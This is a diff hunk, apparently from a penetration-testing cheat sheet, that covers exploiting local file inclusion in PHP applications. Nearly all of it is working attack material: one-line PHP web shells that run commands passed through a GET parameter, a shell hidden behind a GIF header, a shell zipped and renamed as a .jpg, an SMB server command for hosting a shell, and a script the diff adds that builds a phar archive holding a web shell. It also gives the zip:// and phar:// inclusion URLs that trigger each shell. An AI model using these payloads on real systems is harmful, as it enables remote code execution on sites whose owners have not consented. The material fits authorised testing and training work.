@@ -1586,7 +1586,17 @@ $ echo '<?php system($_GET["cmd"]); ?>' > shell.php && impacket-smbserver -smb2s
 $ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
 /index.php?language=./profile_images/shell.gif&cmd=id
 $ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php	
-/index.php?language=zip://shell.zip%23shell.php&cmd=id
+/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+
+# Write this to a shell.php file
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+
 $ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 /index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
 ```
